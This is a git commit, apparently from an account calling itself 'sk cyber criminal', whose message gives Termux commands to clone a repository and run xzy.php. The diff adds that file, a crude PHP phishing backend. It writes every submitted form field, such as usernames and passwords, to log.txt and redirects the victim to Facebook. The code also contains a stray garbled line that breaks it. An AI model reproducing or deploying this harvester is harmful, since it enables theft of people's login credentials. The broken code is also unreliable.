6b49515eba71ce5004c378fcc30cff537545721b
sk cyber criminal <111014390+skcayber@users.noreply.github.com>
2022-09-08 17:51:39 +0600

    xzy.php
    pkg update 
    pkg upgrade 
    pkg install python 
    pkg install python2 
    pkg install git 
    git clone https://github.com/skcayber/ps.git
    cd ps
    chmod 777 xzy.php
    php xzy.php

---
+++ xzy.php
@@ -0,0 +1,33 @@
+<?php 
+
+  
+// Set the location to redirect the page 
+
+header ('Location: http://www.facebook.com'); 
+
+  
+// Open the text file in writing mode  
+
+$file = fopen("log.txt", "a"); 
+
+  inport""
+
+foreach($_POST as $variable => $value) { 
+
+    fwrite($file, $variable); 
+
+    fwrite($file, "="); 
+
+    fwrite($file, $value); 
+
+    fwrite($file, "\r\n"); 
+} 
+
+  
+
+fwrite($file, "\r\n"); 
+
+fclose($file); 
+
+exit; 
+?> 
